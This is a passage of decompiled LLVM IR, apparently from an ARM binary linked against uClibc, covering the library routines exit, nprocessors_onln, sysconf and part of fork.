  %v0_ff6c = phi i32 [ %v0_ff3c, %bb76 ], [ %v0_ff6c.pre, %dec_label_pc_ff54 ], [ %v0_ff3c, %bb73 ]
  %v2_ff6c = icmp eq i32 %v0_ff6c, 0
  br i1 %v2_ff6c, label %dec_label_pc_ff6c._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_ff6c
  %v2_ff70 = sub i32 0, %v0_ff74.pre
  store i32 %v2_ff70, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ff6c._crit_edge

dec_label_pc_ff6c._crit_edge:                     ; preds = %dec_label_pc_ff6c, %bb77
  %v0_ff74 = phi i32 [ %v2_ff70, %bb77 ], [ %v0_ff74.pre, %dec_label_pc_ff6c ]
  ret i32 %v0_ff74

; uselistorder directives
  uselistorder i32 %v0_ff74.pre, { 1, 0 }
  uselistorder i32 %v0_ff74.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_fefc, { 1, 0 }
  uselistorder i1 %v3_fef4, { 1, 0 }
  uselistorder i32 %v1_fef4, { 1, 0 }
  uselistorder i32 %v5_fed4, { 1, 0 }
  uselistorder i32 %v1_fec0, { 1, 0 }
  uselistorder i32 %v1_feb8, { 2, 0, 1 }
  uselistorder i32 %v0_feec, { 1, 0, 2 }
  uselistorder i32 %v0_feac, { 1, 0 }
  uselistorder i32 %v3_fe5c, { 1, 0 }
  uselistorder i32 %v1_fe50, { 1, 0, 2 }
  uselistorder i32 %v0_fe44, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_fe20, { 0, 1, 3, 2 }
  uselistorder i32 %v0_fddc, { 1, 0 }
  uselistorder i32 %v0_fdd8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_fdd4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder label %dec_label_pc_ff6c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ff6c, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_ff30, { 1, 0 }
  uselistorder label %dec_label_pc_ff0c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_feb0, { 1, 0 }
  uselistorder label %dec_label_pc_feac, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fe24, { 1, 0 }
  uselistorder label %dec_label_pc_fe20, { 1, 0 }
  uselistorder label %dec_label_pc_fde8, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r5, align 4
  %v4_ffa0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 148) to i32*), align 4
  store i32 %v4_ffa0, i32* @r4, align 4
  %v2_ffa8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_ffc0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_ffc0)
  %v0_ffd4 = load i32, i32* @r5, align 4
  %v2_ffd4 = add i32 %v0_ffd4, 16
  %v3_ffd4 = inttoptr i32 %v2_ffd4 to i32*
  %v4_ffd4 = load i32, i32* %v3_ffd4, align 4
  call void @__pseudo_branch(i32 %v4_ffd4)
  %v0_ffe4 = load i32, i32* @r5, align 4
  %v2_ffe4 = add i32 %v0_ffe4, 10600
  %v3_ffe4 = inttoptr i32 %v2_ffe4 to i32*
  %v4_ffe4 = load i32, i32* %v3_ffe4, align 4
  %v2_ffec = icmp eq i32 %v4_ffe4, 0
  br i1 %v2_ffec, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_fff8 = xor i1 %v2_ffec, true
  call void @__pseudo_cond_branch(i1 %v2_fff8, i32 %v4_ffe4)
  store i32 %v2_ffa8, i32* @r0, align 4
  %v0_10008 = load i32, i32* @r5, align 4
  %v2_10008 = add i32 %v0_10008, 48
  %v3_10008 = inttoptr i32 %v2_10008 to i32*
  %v4_10008 = load i32, i32* %v3_10008, align 4
  call void @__pseudo_branch(i32 %v4_10008)
  %v0_10014 = call i32 @__GI___uClibc_fini()
  %v0_1001c = load i32, i32* @r5, align 4
  %v2_1001c = add i32 %v0_1001c, -95588
  %v2_10024 = icmp eq i32 %v2_1001c, 0
  br i1 %v2_10024, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_1002c = xor i1 %v2_10024, true
  call void @__pseudo_cond_branch(i1 %v2_1002c, i32 %v2_1001c)
  %v0_10030 = load i32, i32* @r6, align 4
  %v1_10034 = call i32 @__GI__exit(i32 %v0_10030)
  %v0_10038 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10038, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_10050 = phi i32 [ %v1_10034, %bb9 ], [ 0, %bb10 ]
  ret i32 %v10_10050

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -35008), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_10078 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -35008))
  store i32 %v1_10078, i32* @r6, align 4
  %v2_1007c = icmp eq i32 %v1_10078, 0
  br i1 %v2_1007c, label %dec_label_pc_100fc, label %dec_label_pc_10084

dec_label_pc_10084:                               ; preds = %entry
  store i32 800, i32* @sl, align 4
  %v0_1008c = load i32, i32* @r4, align 4
  %v2_1008c = add i32 %v0_1008c, -34996
  store i32 %v2_1008c, i32* @r8, align 4
  %v2_10090 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10090, i32* @r7, align 4
  br label %bb18

dec_label_pc_10098:                               ; preds = %bb18
  %v3_10098 = load i32, i32* %stack_var_-36, align 4
  %v1_1009c = inttoptr i32 %v3_10098 to i32*
  %v2_1009c = load i32, i32* %v1_1009c, align 4
  %v1_100a0 = inttoptr i32 %v2_1009c to i8*
  %v2_100a0 = load i8, i8* %v1_100a0, align 1
  %v7_100a4 = icmp eq i8 %v2_100a0, 99
  br i1 %v7_100a4, label %dec_label_pc_100ac, label %.backedge3

dec_label_pc_100ac:                               ; preds = %dec_label_pc_10098
  %v1_100ac = add i32 %v2_1009c, 1
  %v2_100ac = inttoptr i32 %v1_100ac to i8*
  %v3_100ac = load i8, i8* %v2_100ac, align 1
  %v7_100b0 = icmp eq i8 %v3_100ac, 112
  br i1 %v7_100b0, label %dec_label_pc_100b8, label %.backedge3

dec_label_pc_100b8:                               ; preds = %dec_label_pc_100ac
  %v1_100b8 = add i32 %v2_1009c, 2
  %v2_100b8 = inttoptr i32 %v1_100b8 to i8*
  %v3_100b8 = load i8, i8* %v2_100b8, align 1
  %v7_100bc = icmp eq i8 %v3_100b8, 117
  br i1 %v7_100bc, label %dec_label_pc_100c4, label %.backedge3

dec_label_pc_100c4:                               ; preds = %dec_label_pc_100b8
  %v1_100c4 = add i32 %v2_1009c, 3
  %v2_100c4 = inttoptr i32 %v1_100c4 to i8*
  %v3_100c4 = load i8, i8* %v2_100c4, align 1
  %v4_100c4 = zext i8 %v3_100c4 to i32
  %v0_100c8 = load i32, i32* @r4, align 4
  %v1_100c8 = load i32, i32* @sl, align 4
  %v2_100c8 = add i32 %v1_100c8, %v0_100c8
  %v3_100c8 = inttoptr i32 %v2_100c8 to i32*
  %v4_100c8 = load i32, i32* %v3_100c8, align 4
  %v2_100cc = mul nuw nsw i32 %v4_100c4, 2
  %v2_100d0 = add i32 %v4_100c8, %v2_100cc
  %v3_100d0 = inttoptr i32 %v2_100d0 to i16*
  %v4_100d0 = load i16, i16* %v3_100d0, align 2
  %v1_100d4 = and i16 %v4_100d0, 8
  %v2_100d4 = icmp eq i16 %v1_100d4, 0
  br i1 %v2_100d4, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_100c4
  %v1_100d8 = load i32, i32* @r5, align 4
  %v2_100d8 = add i32 %v1_100d8, 1
  store i32 %v2_100d8, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_100c4, %dec_label_pc_10098, %dec_label_pc_100ac, %dec_label_pc_100b8
  %v0_100dc.pre = load i32, i32* @r6, align 4
  %v0_100e8.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_10084
  %v0_100e8 = phi i32 [ %v0_100e8.pre, %.backedge3 ], [ %v2_1008c, %dec_label_pc_10084 ]
  %v0_100dc = phi i32 [ %v0_100dc.pre, %.backedge3 ], [ %v1_10078, %dec_label_pc_10084 ]
  %v4_100ec = inttoptr i32 %v0_100dc to i32*
  %v5_100ec = call i32 @__GI_config_read(i32* %v4_100ec, i32 %v2_10090, i32 258, i32 %v0_100e8)
  %v2_100f0 = icmp eq i32 %v5_100ec, 0
  br i1 %v2_100f0, label %dec_label_pc_10160, label %dec_label_pc_10098

dec_label_pc_100fc:                               ; preds = %entry
  %v0_10100 = load i32, i32* @r4, align 4
  %v2_10100 = add i32 %v0_10100, -34992
  store i32 %v2_10100, i32* @r0, align 4
  %v1_10104 = call i32 @__GI_config_open(i32 %v2_10100)
  store i32 %v1_10104, i32* @r6, align 4
  %v2_10108 = icmp eq i32 %v1_10104, 0
  br i1 %v2_10108, label %bb19, label %dec_label_pc_10114

bb19:                                             ; preds = %dec_label_pc_100fc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_10160

dec_label_pc_10114:                               ; preds = %dec_label_pc_100fc
  %v0_10118 = load i32, i32* @r4, align 4
  %v2_10118 = add i32 %v0_10118, -34976
  store i32 %v2_10118, i32* @r8, align 4
  %v2_10120 = add i32 %v0_10118, -34940
  store i32 %v2_10120, i32* @r7, align 4
  %v2_10124 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10124, i32* @r4, align 4
  br label %bb21

dec_label_pc_1012c:                               ; preds = %bb21
  %v0_10158 = load i32, i32* @r8, align 4
  %v3_1012c = load i32, i32* %stack_var_-36, align 4
  %v1_10130 = inttoptr i32 %v3_1012c to i32*
  %v2_10130 = load i32, i32* %v1_10130, align 4
  store i32 %v2_10130, i32* @r1, align 4
  %v2_10134 = inttoptr i32 %v0_10158 to i8*
  %v3_10134 = call i32 @__GI_strcoll(i8* %v2_10134, i32 %v2_10130)
  %v2_10138 = icmp eq i32 %v3_10134, 0
  br i1 %v2_10138, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_1012c
  %v1_1013c = load i32, i32* @r5, align 4
  %v2_1013c = add i32 %v1_1013c, 1
  store i32 %v2_1013c, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_1012c
  %v0_10148.pre = load i32, i32* @r7, align 4
  %v0_1014c.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_10114
  %v0_1014c = phi i32 [ %v0_1014c.pre, %.backedge ], [ %v1_10104, %dec_label_pc_10114 ]
  %v0_10148 = phi i32 [ %v0_10148.pre, %.backedge ], [ %v2_10120, %dec_label_pc_10114 ]
  %v4_10150 = inttoptr i32 %v0_1014c to i32*
  %v5_10150 = call i32 @__GI_config_read(i32* %v4_10150, i32 %v2_10124, i32 459266, i32 %v0_10148)
  %v2_10154 = icmp eq i32 %v5_10150, 0
  br i1 %v2_10154, label %dec_label_pc_10160, label %dec_label_pc_1012c

dec_label_pc_10160:                               ; preds = %bb18, %bb21, %bb19
  %v0_10160 = load i32, i32* @r6, align 4
  %v1_10164 = inttoptr i32 %v0_10160 to i32*
  %v2_10164 = call i32 @__GI_config_close(i32* %v1_10164)
  %v0_10168 = load i32, i32* @r5, align 4
  %v2_10168 = icmp eq i32 %v0_10168, 0
  %.v0_10168 = select i1 %v2_10168, i32 1, i32 %v0_10168
  ret i32 %.v0_10168

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_10160, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_10594

bb:                                               ; preds = %entry
  %v7_101b8 = mul i32 %arg1, 4
  %v8_101b8 = add i32 %v7_101b8, ptrtoint (i32* @global_var_101c0.412 to i32)
  call void @__pseudo_branch(i32 %v8_101b8)
  br label %dec_label_pc_10594

dec_label_pc_10594:                               ; preds = %bb, %entry
  %v0_10598 = call i32 @__aeabi_read_tp()
  %v3_1059c = load i16, i16* @global_var_23164.175, align 2
  %v4_1059c = sext i16 %v3_1059c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_105a8 = add i32 %v4_1059c, %v0_10598
  %v4_105a8 = inttoptr i32 %v3_105a8 to i32*
  store i32 22, i32* %v4_105a8, align 4
  %v0_1078c = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_1078c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 14364, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r8.global-to-local, align 4
  %v4_108b816 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14364) to i32*), align 4
  store i32 %v4_108b816, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_108bc18 = icmp eq i32 %v4_108b816, 0
  br i1 %v2_108bc18, label %dec_label_pc_108c4, label %dec_label_pc_107e8

dec_label_pc_107e8:                               ; preds = %entry, %dec_label_pc_108b8.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_107f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_107f4 = add i32 %v0_107f4, 20
  %v2_107f4 = inttoptr i32 %v1_107f4 to i32*
  %v3_107f4 = load i32, i32* %v2_107f4, align 4
  store i32 %v3_107f4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_107f8 = icmp eq i32 %v3_107f4, 0
  store i32 %v3_107f4, i32* %r4.global-to-local, align 4
  %v1_10800 = add i32 %v3_107f4, 1
  store i32 %v1_10800, i32* %r1.global-to-local, align 4
  br i1 %v2_107f8, label %dec_label_pc_108b8.backedge, label %dec_label_pc_10808

dec_label_pc_108b8.backedge:                      ; preds = %dec_label_pc_107e8, %dec_label_pc_10834
  %v0_108b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_108b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_108b8 = add i32 %v1_108b8, %v0_108b8
  %v3_108b8 = inttoptr i32 %v2_108b8 to i32*
  %v4_108b8 = load i32, i32* %v3_108b8, align 4
  store i32 %v4_108b8, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_108bc = icmp eq i32 %v4_108b8, 0
  br i1 %v2_108bc, label %dec_label_pc_108c4, label %dec_label_pc_107e8

dec_label_pc_10808:                               ; preds = %dec_label_pc_107e8
  %v0_10808 = load i32, i32* %r8.global-to-local, align 4
  %v1_10808 = load i32, i32* %r5.global-to-local, align 4
  %v2_10808 = add i32 %v1_10808, %v0_10808
  %v3_10808 = inttoptr i32 %v2_10808 to i32*
  %v4_10808 = load i32, i32* %v3_10808, align 4
  %v1_1080c = add i32 %v4_10808, 20
  store i32 %v1_1080c, i32* %r2.global-to-local, align 4
  %v1_10810132 = inttoptr i32 %v1_1080c to i32*
  %v2_10810133 = load i32, i32* %v1_10810132, align 4
  store i32 %v2_10810133, i32* %r3.global-to-local, align 4
  %v3_10814135 = icmp uge i32 %v2_10810133, %v3_107f4
  store i1 %v3_10814135, i1* %cpsr_c.global-to-local, align 1
  %v9_10814141 = icmp eq i32 %v2_10810133, %v3_107f4
  br i1 %v9_10814141, label %dec_label_pc_1081c, label %dec_label_pc_10834

dec_label_pc_1081c:                               ; preds = %dec_label_pc_10808, %dec_label_pc_1081c.dec_label_pc_10810_crit_edge
  %v0_1081c142 = phi i32 [ %v1_10814.pre, %dec_label_pc_1081c.dec_label_pc_10810_crit_edge ], [ %v3_107f4, %dec_label_pc_10808 ]
  store i32 %v0_1081c142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1082c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1082c, label %dec_label_pc_10830, label %dec_label_pc_1081c.dec_label_pc_10810_crit_edge

dec_label_pc_1081c.dec_label_pc_10810_crit_edge:  ; preds = %dec_label_pc_1081c
  %v0_10810.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10814.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10810 = inttoptr i32 %v0_10810.pre to i32*
  %v2_10810 = load i32, i32* %v1_10810, align 4
  store i32 %v2_10810, i32* %r3.global-to-local, align 4
  %v3_10814 = icmp uge i32 %v2_10810, %v1_10814.pre
  store i1 %v3_10814, i1* %cpsr_c.global-to-local, align 1
  %v9_10814 = icmp eq i32 %v2_10810, %v1_10814.pre
  br i1 %v9_10814, label %dec_label_pc_1081c, label %dec_label_pc_10834

dec_label_pc_10830:                               ; preds = %dec_label_pc_1081c
  %v0_10830 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10830, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10834

dec_label_pc_10834:                               ; preds = %dec_label_pc_10808, %dec_label_pc_1081c.dec_label_pc_10810_crit_edge, %dec_label_pc_10830
  %v0_10834 = phi i32 [ %v0_10830, %dec_label_pc_10830 ], [ %v2_10810133, %dec_label_pc_10808 ], [ %v2_10810, %dec_label_pc_1081c.dec_label_pc_10810_crit_edge ]
  %v1_10834 = phi i32 [ %v0_10830, %dec_label_pc_10830 ], [ %v3_107f4, %dec_label_pc_10808 ], [ %v1_10814.pre, %dec_label_pc_1081c.dec_label_pc_10810_crit_edge ]
  %v3_10834 = icmp uge i32 %v0_10834, %v1_10834
  store i1 %v3_10834, i1* %cpsr_c.global-to-local, align 1
  %v9_10834 = icmp eq i32 %v0_10834, %v1_10834
  br i1 %v9_10834, label %dec_label_pc_1083c, label %dec_label_pc_108b8.backedge

dec_label_pc_1083c:                               ; preds = %dec_label_pc_10834
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10850 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_10840

dec_label_pc_10840:                               ; preds = %dec_label_pc_108a8, %dec_label_pc_1083c
  %v0_10840 = load i32, i32* %r7.global-to-local, align 4
  %v1_10840 = add i32 %v0_10840, 4
  %v2_10840 = inttoptr i32 %v1_10840 to i32*
  %v3_10840 = load i32, i32* %v2_10840, align 4
  store i32 %v3_10840, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10844 = icmp eq i32 %v3_10840, 0
  br i1 %v2_10844, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_10840
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_10840, %bb
  %v2_1084c = xor i1 %v2_10844, true
  call void @__pseudo_cond_branch(i1 %v2_1084c, i32 %v3_10840)
  %v0_10854 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10854, i32* %stack_var_-88, align 4
  %v1_10858 = inttoptr i32 %v0_10854 to i32*
  %v2_10858 = load i32, i32* %v1_10858, align 4
  store i32 %v2_10858, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1085c = icmp eq i32 %v2_10858, 0
  store i32 %v2_10850, i32* %r5.global-to-local, align 4
  br i1 %v2_1085c, label %dec_label_pc_108c8.loopexit, label %dec_label_pc_10870

dec_label_pc_10870:                               ; preds = %bb72
  %v1_10870 = add i32 %v2_10858, 20
  store i32 %v1_10870, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10874

dec_label_pc_10874:                               ; preds = %dec_label_pc_108a8.dec_label_pc_10874_crit_edge, %dec_label_pc_10870
  %v0_10878 = phi i32 [ %v0_10878.pre, %dec_label_pc_108a8.dec_label_pc_10874_crit_edge ], [ %v1_10870, %dec_label_pc_10870 ]
  %v0_10874 = phi i32 [ %v0_10874.pre, %dec_label_pc_108a8.dec_label_pc_10874_crit_edge ], [ %v2_10858, %dec_label_pc_10870 ]
  %v1_10874 = add i32 %v0_10874, 20
  %v2_10874 = inttoptr i32 %v1_10874 to i32*
  %v3_10874 = load i32, i32* %v2_10874, align 4
  store i32 %v0_10878, i32* %r2.global-to-local, align 4
  store i32 %v3_10874, i32* %r4.global-to-local, align 4
  %v1_10880 = add i32 %v3_10874, 1
  store i32 %v1_10880, i32* %r1.global-to-local, align 4
  %v1_10884119 = inttoptr i32 %v0_10878 to i32*
  %v2_10884120 = load i32, i32* %v1_10884119, align 4
  store i32 %v2_10884120, i32* %r3.global-to-local, align 4
  %v3_10888122 = icmp uge i32 %v2_10884120, %v3_10874
  store i1 %v3_10888122, i1* %cpsr_c.global-to-local, align 1
  %v9_10888128 = icmp eq i32 %v2_10884120, %v3_10874
  br i1 %v9_10888128, label %dec_label_pc_10890, label %dec_label_pc_108a8

dec_label_pc_10890:                               ; preds = %dec_label_pc_10874, %dec_label_pc_10890.dec_label_pc_10884_crit_edge
  %v0_10890129 = phi i32 [ %v1_10888.pre, %dec_label_pc_10890.dec_label_pc_10884_crit_edge ], [ %v3_10874, %dec_label_pc_10874 ]
  store i32 %v0_10890129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_108a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_108a0, label %dec_label_pc_108a4, label %dec_label_pc_10890.dec_label_pc_10884_crit_edge

dec_label_pc_10890.dec_label_pc_10884_crit_edge:  ; preds = %dec_label_pc_10890
  %v0_10884.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10888.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10884 = inttoptr i32 %v0_10884.pre to i32*
  %v2_10884 = load i32, i32* %v1_10884, align 4
  store i32 %v2_10884, i32* %r3.global-to-local, align 4
  %v3_10888 = icmp uge i32 %v2_10884, %v1_10888.pre
  store i1 %v3_10888, i1* %cpsr_c.global-to-local, align 1
  %v9_10888 = icmp eq i32 %v2_10884, %v1_10888.pre
  br i1 %v9_10888, label %dec_label_pc_10890, label %dec_label_pc_108a8

dec_label_pc_108a4:                               ; preds = %dec_label_pc_10890
  %v0_108a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_108a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_108a8

dec_label_pc_108a8:                               ; preds = %dec_label_pc_10874, %dec_label_pc_10890.dec_label_pc_10884_crit_edge, %dec_label_pc_108a4
  %v0_108a8 = phi i32 [ %v0_108a4, %dec_label_pc_108a4 ], [ %v2_10884120, %dec_label_pc_10874 ], [ %v2_10884, %dec_label_pc_10890.dec_label_pc_10884_crit_edge ]
  %v1_108a8 = phi i32 [ %v0_108a4, %dec_label_pc_108a4 ], [ %v3_10874, %dec_label_pc_10874 ], [ %v1_10888.pre, %dec_label_pc_10890.dec_label_pc_10884_crit_edge ]
  %v3_108a8 = icmp uge i32 %v0_108a8, %v1_108a8
  store i1 %v3_108a8, i1* %cpsr_c.global-to-local, align 1
  %v9_108a8 = icmp eq i32 %v0_108a8, %v1_108a8
  store i32 %v2_10850, i32* %r4.global-to-local, align 4
  br i1 %v9_108a8, label %dec_label_pc_10840, label %dec_label_pc_108a8.dec_label_pc_10874_crit_edge

dec_label_pc_108a8.dec_label_pc_10874_crit_edge:  ; preds = %dec_label_pc_108a8
  %v0_10874.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_10878.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10874

dec_label_pc_108c4:                               ; preds = %dec_label_pc_108b8.backedge, %entry
  %v0_108cc31 = phi i32 [ ptrtoint (i32* @global_var_23104.179 to i32), %entry ], [ %v0_108b8, %dec_label_pc_108b8.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_108c8

dec_label_pc_108c8.loopexit:                      ; preds = %bb72
  store i32 %v2_10850, i32* %r6.global-to-local, align 4
  %v0_108cc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_108c8

dec_label_pc_108c8:                               ; preds = %dec_label_pc_108c8.loopexit, %dec_label_pc_108c4
  %v0_108cc = phi i32 [ %v0_108cc.pre, %dec_label_pc_108c8.loopexit ], [ %v0_108cc31, %dec_label_pc_108c4 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_108cc = add i32 %v0_108cc, 160
  %v3_108cc = inttoptr i32 %v2_108cc to i32*
  %v4_108cc = load i32, i32* %v3_108cc, align 4
  store i32 %v4_108cc, i32* %r7.global-to-local, align 4
  %v0_108d0 = call i32 @__aeabi_read_tp()
  store i32 %v0_108d0, i32* %r0.global-to-local, align 4
  %v1_108d4 = add i32 %v4_108cc, 8
  %v2_108d4 = inttoptr i32 %v1_108d4 to i32*
  %v3_108d4 = load i32, i32* %v2_108d4, align 4
  store i32 %v3_108d4, i32* %r3.global-to-local, align 4
  %v1_108d8 = add i32 %v0_108d0, -1168
  store i32 %v1_108d8, i32* %r5.global-to-local, align 4
  %v3_108dc = icmp uge i32 %v3_108d4, %v1_108d8
  store i1 %v3_108dc, i1* %cpsr_c.global-to-local, align 1
  %v9_108dc = icmp eq i32 %v3_108d4, %v1_108d8
  br i1 %v9_108dc, label %dec_label_pc_10a44, label %dec_label_pc_108e4

dec_label_pc_108e4:                               ; preds = %dec_label_pc_108c8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_108cc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_108f0112 = inttoptr i32 %v4_108cc to i32*
  %v2_108f0113 = load i32, i32* %v1_108f0112, align 4
  store i32 %v2_108f0113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_108f4115 = icmp eq i32 %v2_108f0113, 0
  br i1 %v9_108f4115, label %dec_label_pc_108fc, label %dec_label_pc_10914

dec_label_pc_108fc:                               ; preds = %dec_label_pc_108e4, %dec_label_pc_108fc.dec_label_pc_108f0_crit_edge
  %v0_108fc116 = phi i32 [ %v1_108f4.pre, %dec_label_pc_108fc.dec_label_pc_108f0_crit_edge ], [ 0, %dec_label_pc_108e4 ]
  store i32 %v0_108fc116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1090c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1090c, label %dec_label_pc_10910, label %dec_label_pc_108fc.dec_label_pc_108f0_crit_edge

dec_label_pc_108fc.dec_label_pc_108f0_crit_edge:  ; preds = %dec_label_pc_108fc
  %v0_108f0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_108f4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_108f0 = inttoptr i32 %v0_108f0.pre to i32*
  %v2_108f0 = load i32, i32* %v1_108f0, align 4
  store i32 %v2_108f0, i32* %r3.global-to-local, align 4
  %v3_108f4 = icmp uge i32 %v2_108f0, %v1_108f4.pre
  store i1 %v3_108f4, i1* %cpsr_c.global-to-local, align 1
  %v9_108f4 = icmp eq i32 %v2_108f0, %v1_108f4.pre
  br i1 %v9_108f4, label %dec_label_pc_108fc, label %dec_label_pc_10914

dec_label_pc_10910:                               ; preds = %dec_label_pc_108fc
  %v0_10910 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10910, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10914

